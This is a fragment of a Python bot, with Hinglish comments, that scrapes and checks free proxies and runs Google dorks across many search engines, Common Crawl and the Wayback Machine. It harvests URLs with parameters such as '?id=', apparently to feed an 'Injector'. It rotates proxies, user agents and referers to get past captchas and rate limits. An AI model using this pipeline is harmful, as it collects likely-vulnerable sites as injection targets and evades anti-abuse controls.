    PSTATS.update({"sources_total": len(PROXY_SOURCES), "sources_ok": 0, "raw": 0, "hosts": []})
    found = []
    done = 0
    lock = asyncio.Lock()
    conn = mk_connector(limit=100, limit_per_host=8)
    async with aiohttp.ClientSession(connector=conn) as session:
        async def one(kind, url):
            nonlocal done
            u, px, lines, ok = await fetch_source(session, kind, url, timeout)
            async with lock:
                done += 1
                if ok:
                    PSTATS["sources_ok"] += 1
                    PSTATS["raw"] += lines
                    try:
                        h = url.split("/")[2]
                        if h not in PSTATS["hosts"]:
                            PSTATS["hosts"].append(h)
                    except Exception:
                        pass
                    found.extend(px)
                if progress and done % 5 == 0:
                    try:
                        await progress({"done": done, "total": len(PROXY_SOURCES),
                                        "ok": PSTATS["sources_ok"], "px": len(found)})
                    except Exception:
                        pass
        await asyncio.gather(*[one(k, u) for k, u in PROXY_SOURCES], return_exceptions=True)
    uniq = _uniq(found)
    _PROXY_CACHE.update({"t": time.time(), "data": uniq})
    return uniq


# ── very fast checker ────────────────────────────────────────────────────────
CHECK_TARGETS = [
    ("http://httpbin.org/ip", 5000),
    ("http://api.ipify.org?format=json", 5000),
    ("http://ifconfig.me/ip", 6000),
    ("http://ip-api.com/json", 6000),
]


async def check_one(session, proxy: str, sem: asyncio.Semaphore, timeout: float = 6.0):
    """Multi-endpoint check — 2 targets try, IP regex se confirm."""
    targets = random.sample(CHECK_TARGETS, min(2, len(CHECK_TARGETS)))
    px_conn, _ph, _pip, _psrc = await proxy_connect_url(proxy)
    if _ph and not _pip:
        return {"url": proxy, "ok": False}
    async with sem:
        for url, _t in targets:
            t0 = time.perf_counter()
            try:
                async with session.get(url, proxy=px_conn, headers=UA,
                                       timeout=aiohttp.ClientTimeout(total=timeout),
                                       ssl=False, allow_redirects=True) as r:
                    if r.status == 200:
                        body = await r.text(errors="ignore")
                        if len(body) < 4000 and re.search(r"\d{1,3}(?:\.\d{1,3}){3}", body):
                            ms = int((time.perf_counter() - t0) * 1000)
                            return {"url": proxy, "ms": ms, "ok": True}
            except Exception:
                continue
    return {"url": proxy, "ok": False}


async def check_proxies(proxies: list, concurrency: int = 400, timeout: float = 6.0,
                        progress=None, want: int = 0) -> list:
    """High concurrency checker — phone pe bhi 400 parallel."""
    good = []
    sem = asyncio.Semaphore(max(20, min(1000, concurrency)))
    conn = mk_connector(limit=0, force_close=True)
    total = len(proxies)
    done = 0
    lock = asyncio.Lock()
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for p in proxies:
            tasks.append(asyncio.create_task(check_one(session, p, sem, timeout)))
        for fut in asyncio.as_completed(tasks):
            res = await fut
            async with lock:
                done += 1
                if res.get("ok"):
                    good.append(res)
                if progress and done % 25 == 0:
                    try:
                        await progress({"done": done, "total": total, "alive": len(good)})
                    except Exception:
                        pass
            if want and len(good) >= want:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
    good.sort(key=lambda x: x.get("ms", 99999))
    return good


def proxy_batch_size() -> int:
    """Ek baar me kitne proxies check ho — admin panel se set."""
    try:
        v = int(sget("proxy_batch", 4000) or 4000)
    except Exception:
        v = 4000
    return max(200, min(20000, v))


def inj_batch_size() -> int:
    """Injector me ek baar me kitne URLs process ho."""
    try:
        v = int(sget("inj_batch", 200) or 200)
    except Exception:
        v = 200
    return max(1, min(5000, v))


def want_alive_n() -> int:
    """Kitne alive proxies chahiye — 0 = saare batches poore karo."""
    try:
        return max(0, int(sget("want_alive", 0) or 0))
    except Exception:
        return 0


async def check_proxies_batched(proxies, batch=None, concurrency=None, timeout=None,
                                progress=None, want=None):
    """SAARE proxies check — 4k ka batch, phir agla 4k… jab tak sab na ho.

    Batch size + target alive admin panel se (`/batch`) set hote hain.
    """
    proxies = list(dict.fromkeys([x for x in (proxies or []) if x]))
    if not proxies:
        return []
    batch = int(batch or proxy_batch_size())
    try:
        concurrency = int(concurrency or sget("concurrency", 400) or 400)
    except Exception:
        concurrency = 400
    try:
        timeout = float(timeout or sget("check_timeout", 6) or 6)
    except Exception:
        timeout = 6.0
    want = want_alive_n() if want is None else int(want)
    total = len(proxies)
    nbatch = (total + batch - 1) // batch
    good, seen = [], set()
    _uid = str(ACTIVE_UID.get("uid")) if ACTIVE_UID.get("uid") else None
    for bi in range(nbatch):
        if _uid and stop_requested(_uid):
            break
        chunk = proxies[bi * batch:(bi + 1) * batch]

        async def _p(st, _bi=bi, _chunk=chunk):
            if not progress:
                return
            try:
                await progress({"batch": _bi + 1, "batches": nbatch,
                                "batch_size": batch, "total": total,
                                "chunk": len(_chunk),
                                "done": _bi * batch + int(st.get("done", 0)),
                                "alive": len(good) + int(st.get("alive", 0))})
            except Exception:
                pass

        left = max(0, want - len(good)) if want else 0
        got = await check_proxies(chunk, concurrency=concurrency, timeout=timeout,
                                  progress=_p, want=left)
        for g in got:
            if g.get("url") not in seen:
                seen.add(g["url"])
                good.append(g)
            if want and len(good) >= want:
                break
        if want and len(good) >= want:
            break
    good.sort(key=lambda x: x.get("ms", 99999))
    return good


ROT_COOLDOWN = 10.0          # rotating endpoint — chhota rest, upstream khud IP badalta hai


def rot_proxies() -> list:
    """Rotating endpoints — settings + data/rot_proxy.txt (credentials phone pe rehte hain)."""
    out = [str(x).strip() for x in (sget("rot_proxy", []) or []) if str(x).strip()]
    pth = os.path.join(DATA_DIR, "rot_proxy.txt")
    if os.path.exists(pth):
        try:
            with open(pth, encoding="utf-8", errors="ignore") as f:
                out += parse_proxies(f.read())
        except Exception:
            pass
    return _uniq(out)


def rot_save(urls: list) -> list:
    urls = _uniq([u for u in (urls or []) if u])
    sset("rot_proxy", urls)
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(os.path.join(DATA_DIR, "rot_proxy.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(urls) + ("\n" if urls else ""))
    except Exception:
        pass
    global PROXIES
    PROXIES = _merge_rot([p for p in (PROXIES or []) if not (isinstance(p, dict) and p.get("rot"))])
    return urls


def _merge_rot(pool: list) -> list:
    """Pool me rotating endpoints add (marker rot=True) — duplicate nahi."""
    pool = list(pool or [])
    have = {p.get("url") if isinstance(p, dict) else str(p) for p in pool}
    for u in rot_proxies():
        if u not in have:
            pool.append({"url": u, "ms": 0, "ok": True, "rot": True})
    return pool


def proxy_available() -> bool:
    return bool(PROXIES or load_proxy_pool() or rot_proxies())


def save_proxy_pool(good: list) -> None:
    global PROXIES
    PROXIES = _merge_rot(good)
    jsave("proxies", {"at": datetime.now().isoformat(timespec="seconds"),
                      "list": [{"url": g["url"], "ms": g.get("ms", 0)} for g in good]})


def load_proxy_pool() -> list:
    global PROXIES
    if PROXIES:
        return PROXIES
    d = jload("proxies", {})
    PROXIES = _merge_rot([{"url": x["url"], "ms": x.get("ms", 0), "ok": True}
                          for x in (d.get("list") or [])])
    return PROXIES


def manual_proxies() -> list:
    """data/manual_proxies.txt — 1 line = 1 proxy."""
    p = os.path.join(DATA_DIR, "manual_proxies.txt")
    if not os.path.exists(p):
        return []
    try:
        with open(p, encoding="utf-8", errors="ignore") as f:
            return parse_proxies(f.read())
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
#  PARSER — asli search engines, asli URLs
# ═══════════════════════════════════════════════════════════════════════════════
JUNK_HOSTS = {
    "duckduckgo.com", "google.com", "www.google.com", "bing.com", "www.bing.com",
    "yahoo.com", "search.yahoo.com", "mojeek.com", "www.mojeek.com", "brave.com",
    "search.brave.com", "startpage.com", "yandex.com", "yandex.ru", "baidu.com",
    "facebook.com", "twitter.com", "x.com", "instagram.com", "linkedin.com",
    "youtube.com", "pinterest.com", "tiktok.com", "reddit.com", "quora.com",
    "wikipedia.org", "amazon.com", "ebay.com", "w3.org", "schema.org",
    "github.com", "gitlab.com", "stackoverflow.com", "medium.com", "blogspot.com",
    "searx.be", "searxng.site", "priv.au", "search.bus-hit.me", "baresearch.org",
}
JUNK_EXT = {".css", ".js", ".woff", ".woff2", ".ttf", ".eot", ".ico", ".svg", ".png",
            ".jpg", ".jpeg", ".gif", ".webp", ".mp4", ".mp3", ".avi", ".map"}

# 9 engines — bing & mojeek bina proxy bhi chalte hain (v2.11)
ENGINE_URLS = {
    "ddgl":   "https://lite.duckduckgo.com/lite/?q={q}&s={p}",
    "ddg":    "https://html.duckduckgo.com/html/?q={q}&s={p}",
    "bing":   "https://www.bing.com/search?q={q}&first={p}&count=30&setlang=en",
    "mojeek": "https://www.mojeek.com/search?q={q}&s={p}",
    "marginalia": "https://old-search.marginalia.nu/search?query={q}",
    "google": "https://www.google.com/search?q={q}&num=20&hl=en&start={p}&gbv=1",
    "brave":  "https://search.brave.com/search?q={q}&offset={p}&source=web",
    "yandex": "https://yandex.com/search/?text={q}&p={p}&lr=0",
    "yahoo":  "https://search.yahoo.com/search?p={q}&b={p}&n=30",
}

# (start, step) — har engine ka pagination offset
ENGINE_PAGE = {
    "ddgl": (0, 10),
    "ddg": (0, 30), "bing": (1, 10), "bingr": (1, 10),
    "mojeek": (0, 10), "yahoo": (1, 10),
    "google": (0, 30), "brave": (0, 20), "startpage": (1, 10), "yandex": (0, 10),
    "qwant": (1, 10), "ecosia": (1, 10), "marginalia": (0, 10), "searx": (1, 1),
    "sxng": (1, 1),
}

# DDG GET pe "anomaly/challenge" deta hai — POST form se asli result aate hain
ENGINE_POST = {
    "ddg":  "https://html.duckduckgo.com/html/",
    "ddgl": "https://lite.duckduckgo.com/lite/",
}

ENGINE_ORDER = ["bing", "mojeek", "ddgl", "ddg", "yahoo", "brave", "google",
                "yandex", "marginalia"]

# Challenge / captcha page — ye "0 results" nahi, BLOCK hai
BLOCK_MARKS = ("anomaly-modal", "anomaly_modal", "unusual traffic", "are you a robot",
               "captcha", "challenge-form", "cf-challenge", "enable javascript and cookies",
               "our systems have detected", "verify you are human", "access denied",
               "ddg-lite__anomaly")

# ── Kitne engines? Termux/phone pe kam = fast. Ye 3 bina proxy bhi chalte hain ──
ENGINE_SETS = {
    # fast = bina proxy bhi chalta hai (kam = slow net pe bhi jaldi)
    "fast":   ["bing", "mojeek", "ddgl"],
    # normal = 5 engines — bing + mojeek bina proxy bhi chalte hain
    "normal": ["bing", "mojeek", "ddgl", "ddg", "yahoo"],
    # max = 8 (google/yandex ke liye proxy zaroori)
    "max":    ["bing", "mojeek", "ddgl", "ddg", "yahoo", "brave",
               "google", "yandex", "marginalia"],
}
ENGINE_LABEL = {"fast": "⚡ FAST — 3 engines (no proxy)",
                "normal": "⚖️ NORMAL — 5 engines (bing+mojeek always)",
                "max": "🐢 MAX — 9 engines (proxy needed)"}
ENGINE_TIMEOUT = {"fast": 6.0, "normal": 8.0, "max": 10.0}
ENGINE_DEAD_AFTER = 3          # 3 miss → is run me skip (global state nahi)

# Bina proxy ye engines pakka block karte hain → try bhi mat karo (time bachao)
NO_PROXY_DEAD = {"google", "yandex"}      # bina proxy ye 2 pakka block
ENGINE_MISS = {}      # engine -> consecutive empty/blocked count
ENGINE_LAST = {}      # engine -> (reason, time) — /enginetest + 0-URL card me dikhta hai


def looks_blocked(body: str) -> bool:
    """Page captcha/challenge hai? (200 OK par bhi block ho sakta hai)."""
    b = str(body or "")[:60000].lower()
    if not b:
        return True
    return any(m in b for m in BLOCK_MARKS)


def engine_reason(err: str) -> str:
    """Raw error ko insaan wali bhasha me."""
    e = (err or "").lower()
    if not err:
        return "—"
    if e == "ok":
        return "results returned, none match the dork"
    if e.startswith("http 403") or e.startswith("http 429"):
        return "blocked (IP/rate limit)"
    if e.startswith("http"):
        return err
    if "timeout" in e or "timed out" in e:
        return "timeout"
    if "name" in e or "dns" in e or "resolve" in e or "getaddrinfo" in e:
        return "DNS fail"
    if "ssl" in e or "certificate" in e:
        return "SSL error"
    if "0 result" in e:
        return "page aayi, 0 results"
    return err[:40]


def engines_mode() -> str:
    """Kaunsa mode chal raha hai — 'fast' | 'normal' | 'max'."""
    m = str(sget("engines_mode", "normal") or "normal").lower()
    return m if m in ENGINE_SETS else "normal"


def engine_list(mode: str = None) -> list:
    return list(ENGINE_SETS.get(mode or engines_mode(), ENGINE_SETS["normal"]))


def user_mode(context=None) -> str:
    """User ka apna mode (agar chuna hai) warna global default."""
    try:
        m = str((context.user_data.get("engines_mode") if context else "") or "").lower()
        if m in ENGINE_SETS:
            return m
    except Exception:
        pass
    return engines_mode()

# ── SearXNG — public instances (searx.space se khud update hote hain) ────────
SEARX_FALLBACK = [
    "https://searx.be", "https://baresearch.org", "https://search.inetol.net",
    "https://priv.au", "https://searxng.site", "https://search.bus-hit.me",
    "https://searx.tiekoetter.com", "https://opnxng.com", "https://search.sapti.me",
    "https://paulgo.io", "https://searx.work", "https://search.hbubli.cc",
]
SEARX_INSTANCES = {"t": 0.0, "list": []}


async def searx_instances(force: bool = False) -> list:
    """searx.space/data/instances.json se chalti-phirti instances."""
    now = time.time()
    if not force and SEARX_INSTANCES["list"] and (now - SEARX_INSTANCES["t"] < 6 * 3600):
        return SEARX_INSTANCES["list"]
    # disk cache
    if not force:
        d = jload("searx_instances", {})
        if d.get("list") and (now - float(d.get("t") or 0) < 24 * 3600):
            SEARX_INSTANCES.update({"t": float(d.get("t") or 0), "list": d["list"]})
            return d["list"]
    good = []
    try:
        async with aiohttp.ClientSession(connector=mk_connector(limit=8)) as s:
            async with s.get("https://searx.space/data/instances.json",
                             headers=UA, ssl=False,
                             timeout=aiohttp.ClientTimeout(total=20)) as r:
                if r.status == 200:
                    j = await r.json(content_type=None)
                    for base, meta in (j.get("instances") or {}).items():
                        try:
                            http = meta.get("http") or {}
                            search = (meta.get("timing") or {}).get("search") or {}
                            if http.get("status_code") != 200:
                                continue
                            if float(search.get("success_percentage") or 0) < 70:
                                continue
                            if (meta.get("network_type") or "normal") != "normal":
                                continue
                            good.append(base.rstrip("/"))
                        except Exception:
                            continue
    except Exception:
        good = []
    if not good:
        good = list(SEARX_FALLBACK)
    good = _uniq(good)[:30]
    SEARX_INSTANCES.update({"t": now, "list": good})
    jsave("searx_instances", {"t": now, "list": good})
    return good


async def fetch_sxng(session, dork: str, page: int = 1, proxy=None,
                     timeout: float = 12.0) -> list:
    """SearXNG se results — pehle JSON, phir HTML fallback. Instance rotate."""
    inst = await searx_instances()
    random.shuffle(inst)
    for base in inst[:3]:
        for fmt in ("json", "html"):
            url = "%s/search?q=%s&pageno=%d&language=en&safesearch=0" % (
                base, quote_plus(dork), max(1, page))
            if fmt == "json":
                url += "&format=json"
            kw = {"headers": UA, "timeout": aiohttp.ClientTimeout(total=timeout),
                  "ssl": False, "allow_redirects": True}
            if proxy:
                kw["proxy"] = proxy
            try:
                async with session.get(url, **kw) as r:
                    if r.status != 200:
                        continue
                    body = await r.text(errors="ignore")
                    if not body:
                        continue
                    urls = extract_urls("sxng", body)
                    if urls:
                        return urls
            except Exception:
                continue
    return []


TRACK_PARAMS = {
    "srsltid", "gclid", "dclid", "gbraid", "wbraid", "fbclid", "msclkid",
    "yclid", "twclid", "igshid", "ttclid", "li_fat_id",
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "utm_id", "utm_name", "utm_reader", "utm_brand", "utm_social",
    "mc_cid", "mc_eid", "ref_src", "_ga", "_gl", "spm", "scm",
}


def _strip_track(query: str) -> str:
    """srsltid/gclid/utm_* jaise tracking params hatao (dedupe saaf rahe)."""
    if not query:
        return ""
    keep = []
    for part in query.split("&"):
        if not part:
            continue
        k = part.split("=", 1)[0].lower()
        if k in TRACK_PARAMS:
            continue
        keep.append(part)
    return "&".join(keep)


def _bing_unwrap(u: str) -> str:
    """bing.com/ck/a?...&u=a1<base64url> → asli URL. Warna wahi wapas."""
    try:
        if "bing.com/ck/a" not in u:
            return u
        q = parse_qs(urlparse(u).query)
        raw = (q.get("u") or [""])[0]
        if not raw.startswith("a1"):
            return u
        b = raw[2:]
        b += "=" * (-len(b) % 4)
        dec = base64.urlsafe_b64decode(b.encode()).decode("utf-8", "ignore")
        return dec if dec.startswith("http") else u
    except Exception:
        return u


def _clean_url(u: str) -> str:
    u = _html.unescape(u or "").strip().strip('"\'')
    if u.startswith("//"):
        u = "https:" + u
    if not u.startswith("http"):
        return ""
    u = _bing_unwrap(u)
    if not u.startswith("http"):
        return ""
    try:
        p = urlparse(u)
        host = (p.hostname or "").lower()
        if not host:
            return ""
        base = ".".join(host.split(".")[-2:]) if host.count(".") >= 1 else host
        if host in JUNK_HOSTS or base in JUNK_HOSTS:
            return ""
        path = (p.path or "").lower()
        for e in JUNK_EXT:
            if path.endswith(e):
                return ""
        if len(u) > 500:
            return ""
        q2 = _strip_track(p.query or "")
        return "%s://%s%s%s" % (p.scheme or "http", host, p.path,
                                ("?" + q2) if q2 else "")
    except Exception:
        return ""


def extract_urls(engine: str, body: str) -> list:
    """Engine ke HTML se result URLs nikaalo."""
    out = []
    if engine in ("ddg", "ddgl"):
        for m in re.finditer(r'uddg=([A-Za-z0-9%._~\-]+)', body):
            out.append(unquote(m.group(1)))
        for m in re.finditer(r'class="result__a"[^>]+href="([^"]+)"', body):
            out.append(_html.unescape(m.group(1)))
        # lite page ke asli result rows (nav/footer links NAHI)
        for m in re.finditer(r'class="result-link"[^>]*href="([^"]+)"', body):
            out.append(_html.unescape(m.group(1)))
        for m in re.finditer(r'<a[^>]+class="[^"]*result-link[^"]*"[^>]+href="([^"]+)"',
                             body):
            out.append(_html.unescape(m.group(1)))
        if not out:                                # last try: lite table rows
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*'
                                 r'class="[^"]*(?:result|link)[^"]*"', body):
                out.append(_html.unescape(m.group(1)))
    elif engine == "bing":
        for m in re.finditer(r'<h2[^>]*>\s*<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'<cite[^>]*>(.*?)</cite>', body, re.S):
            out.append(re.sub(r"<[^>]+>", "", m.group(1)))
    elif engine == "bingr":                        # RSS — seedhe <link>
        for m in re.finditer(r"<item>(.*?)</item>", body, re.S):
            for lm in re.finditer(r"<link>\s*(https?://[^<\s]+)\s*</link>",
                                  m.group(1)):
                out.append(_html.unescape(lm.group(1)))
        if not out:
            for m in re.finditer(r"<link>\s*(https?://[^<\s]+)\s*</link>", body):
                out.append(_html.unescape(m.group(1)))
    elif engine == "mojeek":
        for m in re.finditer(r'<a[^>]+class="[^"]*\bob\b[^"]*"[^>]+href="([^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*class="[^"]*ob[^"]*"', body):
            out.append(m.group(1))
    elif engine in ("yahoo", "startpage", "brave", "google"):
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'/url\?q=(https?%3A[^&"]+)', body):
            out.append(unquote(m.group(1)))
    elif engine == "searx":
        try:
            j = json.loads(body)
            for r in (j.get("results") or []):
                out.append(str(r.get("url") or ""))
        except Exception:
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
                out.append(m.group(1))
    elif engine == "sxng":
        # JSON API
        ok_json = False
        try:
            j = json.loads(body)
            ok_json = True
            for r in (j.get("results") or []):
                out.append(str(r.get("url") or ""))
        except Exception:
            pass
        if not ok_json:
            # HTML — searxng result links <a class="url_header" href=...> / h3 a
            for m in re.finditer(r'<a[^>]+class="[^"]*url_header[^"]*"[^>]+href="([^"]+)"', body):
                out.append(m.group(1))
            for m in re.finditer(r'<h3>\s*<a[^>]+href="(https?://[^"]+)"', body):
                out.append(m.group(1))
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]+rel="noreferrer"', body):
                out.append(m.group(1))
    elif engine == "yandex":
        for m in re.finditer(r'<a[^>]+class="[^"]*Link[^"]*"[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'href="(https?://[^"]+)"[^>]*target="_blank"', body):
            out.append(m.group(1))
    elif engine in ("qwant", "ecosia", "marginalia"):
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
    return _uniq([x for x in (_clean_url(u) for u in out) if x])


def engine_miss_add(engine: str, miss: dict = None) -> None:
    """Miss count — per-run dict (agar diya) warna global. Do scans mix nahi honge."""
    if miss is not None:
        miss[engine] = miss.get(engine, 0) + 1
    ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1        # UI stat ke liye


def reset_engine_miss() -> None:
    """Naya scan = naya count. Purane scan ka block agle scan me nahi aayega."""
    ENGINE_MISS.clear()


async def fetch_engine(session, engine: str, dork: str, proxy=None,
                       timeout: float = 15.0, page: int = 0,
                       rot=None, miss: dict = None) -> list:
    """Ek engine se results. rot=ProxyRotator → fail par naya proxy, hard timeout."""
    url = ENGINE_URLS.get(engine)
    if not url:
        return []
    base, step = ENGINE_PAGE.get(engine, (0, 10))
    try:
        target = url.format(q=quote_plus(dork), p=base + int(page) * step)
    except Exception:
        target = url.format(q=quote_plus(dork))
    post_url = ENGINE_POST.get(engine)
    post_data = None
    if post_url:
        # DDG: POST form (GET pe chup-chaap challenge page aata hai)
        post_data = {"q": dork, "kl": "us-en"}
        if int(page):
            post_data["s" if engine == "ddg" else "dc"] = str(base + int(page) * step)
        target = post_url
    hdrs = dict(UA)
    hdrs["Referer"] = random.choice(
        ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
         "https://search.yahoo.com/", "https://search.brave.com/"])
    deadline = time.time() + max(3.0, float(timeout))
    last_err = ""
    for attempt in (1, 2, 3):
        px = proxy if proxy else (rot.next() if rot else None)
        kw = {"headers": dict(hdrs, **{"User-Agent": random.choice(UA_LIST)}),
              "timeout": aiohttp.ClientTimeout(
                  total=max(2.0, min(float(timeout), deadline - time.time() + 0.5))),
              "ssl": False, "allow_redirects": True}
        if px:
            px_conn, _ph, _pip, _psrc = await proxy_connect_url(px)
            if _ph and not _pip:                  # DNS hi fail — proxy chhod do
                last_err = "proxy DNS fail (%s)" % _ph
                continue
            kw["proxy"] = px_conn
        try:
            _req = (session.post(target, data=post_data, **kw) if post_data
                    else session.get(target, **kw))
            async with _req as r:
                if r.status != 200:
                    last_err = "HTTP %s" % r.status
                    if rot and px and r.status in (403, 407, 429, 502, 503):
                        rot.dead(px)                 # proxy jal gaya → agla
                    if r.status not in (403, 407, 429, 500, 502, 503) or attempt == 3:
                        ENGINE_LAST[engine] = (last_err, time.time())
                        engine_miss_add(engine, miss)
                        return []
                    await asyncio.sleep(0.15)
                    continue
                body = await r.text(errors="ignore")
                if not body:
                    ENGINE_LAST[engine] = ("empty body", time.time())
                    engine_miss_add(engine, miss)
                    return []
                if looks_blocked(body):
                    last_err = "blocked page (captcha/challenge)"
                    if rot and px:
                        rot.dead(px)
                    if attempt == 3:
                        ENGINE_LAST[engine] = (last_err, time.time())
                        engine_miss_add(engine, miss)
                        return []
                    continue
                urls = extract_urls(engine, body)
                # 1-2 links = nav links, asli results nahi (ddg ka classic dhokha)
                if urls and len(urls) < 3 and engine in ("ddg", "ddgl", "mojeek"):
                    last_err = "0 results (nav links only)"
                    if attempt == 3:
                        ENGINE_LAST[engine] = (last_err, time.time())
                        engine_miss_add(engine, miss)
                        return []
                    continue
                if urls:
                    if rot and px:
                        rot.ok(px)
                    ENGINE_LAST[engine] = ("ok", time.time())
                    return urls
                # page aayi par 0 results — proxy badal ke ek aur try
                last_err = "0 results"
                if attempt == 3:
                    ENGINE_LAST[engine] = (last_err, time.time())
                    engine_miss_add(engine, miss)
                    return []
                if rot and px:
                    rot.dead(px)
                await asyncio.sleep(0.1)
        except asyncio.TimeoutError:
            last_err = "timeout"
        except Exception as exc:
            last_err = type(exc).__name__ + ": " + str(exc)[:50]
            if rot and px:
                rot.dead(px)
        if time.time() >= deadline:              # hard cap — kabhi block nahi
            break
        await asyncio.sleep(0.1)
    ENGINE_LAST[engine] = (last_err or "fail", time.time())
    engine_miss_add(engine, miss)
    return []


async def wayback_urls(domain: str, limit: int = 300, proxy=None) -> list:
    """Wayback CDX — captcha nahi, site: dork ke liye best."""
    url = ("http://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original"
           "&collapse=urlkey&limit=%d&filter=statuscode:200" % (quote_plus(domain), limit))
    try:
        kw = {"timeout": aiohttp.ClientTimeout(total=25), "ssl": False, "headers": UA}
        if proxy:
            kw["proxy"] = proxy
        async with aiohttp.ClientSession(connector=mk_connector(limit=8)) as s:
            async with s.get(url, **kw) as r:
                if r.status != 200:
                    return []
                txt = await r.text(errors="ignore")
        rows = json.loads(txt)
        return _uniq([_clean_url(x[0]) for x in rows[1:] if x and _clean_url(x[0])])
    except Exception:
        return []


_STRICT_INURL = re.compile(r'(?:inurl|allinurl):\s*\(?"?([^"\s)]+)', re.I)
_STRICT_EXT = re.compile(r'(?:filetype|ext):\s*\(?"?([a-z0-9]{2,6})', re.I)


def dork_match(url: str, dork: str) -> bool:
    """URL ko dork ke inurl / filetype constraints se match karta hai.

    intitle / intext verify nahi ho sakte (page fetch chahiye) — unhe skip
    karte hain. OR (|) wale dork pe bhi skip.
    """
    if not url or not dork:
        return True
    if "|" in dork:
        return True
    low = url.lower()
    path = low.split("?")[0]
    ok = True

    inurls = _STRICT_INURL.findall(dork)
    for pat in inurls:
        pat = pat.strip().lower()
        if not pat:
            continue
        if pat in low:
            continue
        # '?id=' jaisa pattern — query me bas key check karo
        if "=" in pat and "?" in pat:
            key = pat.split("=")[0].split("?")[-1]
            if key and (("?" + key + "=") in low or ("&" + key + "=") in low):
                continue
        return False

    exts = _STRICT_EXT.findall(dork)
    for e in exts:
        e = e.lower()
        if path.endswith("." + e):
            continue
        if ("." + e + "/") in path or ("." + e + "?") in low:
            continue
        # sub-path me extension ho sakta hai
        if ("." + e) in path:
            continue
        return False
    return ok


# ── COMMON CRAWL CDX — 100% free, koi API key nahi ───────────────────────────
CC_CACHE = {"t": 0.0, "api": ""}


async def cc_index(session) -> str:
    """Latest Common Crawl index endpoint (collinfo.json se)."""
    if CC_CACHE["api"] and (time.time() - CC_CACHE["t"] < 86400):
        return CC_CACHE["api"]
    d = jload("cc_index", {})
    if d.get("api") and (time.time() - float(d.get("t") or 0) < 86400):
        CC_CACHE.update({"t": float(d["t"]), "api": d["api"]})
        return d["api"]
    try:
        async with session.get("https://index.commoncrawl.org/collinfo.json",
                               headers=UA, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status == 200:
                j = await r.json(content_type=None)
                if isinstance(j, list) and j:
                    api = str(j[0].get("cdx-api") or "")
                    if api:
                        CC_CACHE.update({"t": time.time(), "api": api})
                        jsave("cc_index", {"t": time.time(), "api": api})
                        return api
    except Exception:
        pass
    return ""


async def cc_urls(domain: str, limit: int = 500, proxy=None) -> list:
    """Common Crawl se ek domain ke URLs — free, unlimited-ish, koi key nahi."""
    domain = (domain or "").strip().lower().lstrip(".")
    if not domain:
        return []
    limit = max(10, min(5000, int(limit or 500)))
    conn = mk_connector(limit=8)
    async with aiohttp.ClientSession(connector=conn) as session:
        api = await cc_index(session)
        if not api:
            return []
        kw = {"params": {"url": "%s/*" % domain, "output": "json", "limit": str(limit),
                         "fl": "url", "filter": "=status:200",
                         "collapse": "urlkey"},
              "headers": UA, "ssl": False,
              "timeout": aiohttp.ClientTimeout(total=45)}
        if proxy:
            kw["proxy"] = proxy
        try:
            async with session.get(api, **kw) as r:
                if r.status != 200:
                    return []
                txt = await r.text(errors="ignore")
        except Exception:
            return []
    out = []
    for line in txt.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
            u = str(o.get("url") or "")
        except Exception:
            continue
        cu = _clean_url(u)
        if cu:
            out.append(cu)
    return _uniq(out)


def domains_from_dorks(dorks: list) -> list:
    """site:example.com wale dorks se domain nikaalo (CDX ke liye)."""
    out = []
    for d in dorks or []:
        for m in re.finditer(r"site:\s*([a-z0-9.-]+\.[a-z]{2,})", str(d), re.I):
            out.append(m.group(1).lower())
    return _uniq(out)


# ── optional paid/free API keys (Google CSE / SerpAPI) ───────────────────────
def api_keys() -> dict:
    return {
        "cse_key": str(sget("cse_key") or ""),
        "cse_cx": str(sget("cse_cx") or ""),
        "serpapi": str(sget("serpapi") or ""),
        "serper": str(sget("serper") or ""),
        "brave": str(sget("brave") or ""),
    }


# ── SERPER (google.serper.dev) — 2,500 free queries, no card ────────────────
async def serper_search(session, dork: str, num: int = 20, page: int = 1) -> list:
    """Google results JSON — dork (inurl:/site:) support karta hai."""
    k = api_keys()
    if not k["serper"]:
        return []
    try:
        async with session.post(
                "https://google.serper.dev/search",
                headers={"X-API-KEY": k["serper"], "Content-Type": "application/json"},
                json={"q": dork, "num": min(100, max(1, num)), "page": max(1, page)},
                ssl=False, timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status != 200:
                return []
            j = await r.json(content_type=None)
        out = [str(it.get("link") or "") for it in (j.get("organic") or [])]
        return _uniq([u for u in (_clean_url(x) for x in out) if u])
    except Exception:
        return []


# ── BRAVE SEARCH API (api.search.brave.com) — $5 free credit/month ──────────
async def brave_search(session, dork: str, count: int = 20) -> list:
    k = api_keys()
    if not k["brave"]:
        return []
    try:
        async with session.get(
                "https://api.search.brave.com/res/v1/web/search",
                params={"q": dork, "count": min(20, max(1, count))},
                headers={"X-Subscription-Token": k["brave"],
                         "Accept": "application/json"},
                ssl=False, timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status != 200:
                return []
            j = await r.json(content_type=None)
        out = [str(it.get("url") or "") for it in ((j.get("web") or {}).get("results") or [])]
        return _uniq([u for u in (_clean_url(x) for x in out) if u])
    except Exception:
        return []


async def cse_search(session, dork: str, num: int = 10, start: int = 1) -> list:
    """Google Custom Search JSON API — 100 queries/day FREE (key + cx chahiye)."""
    k = api_keys()
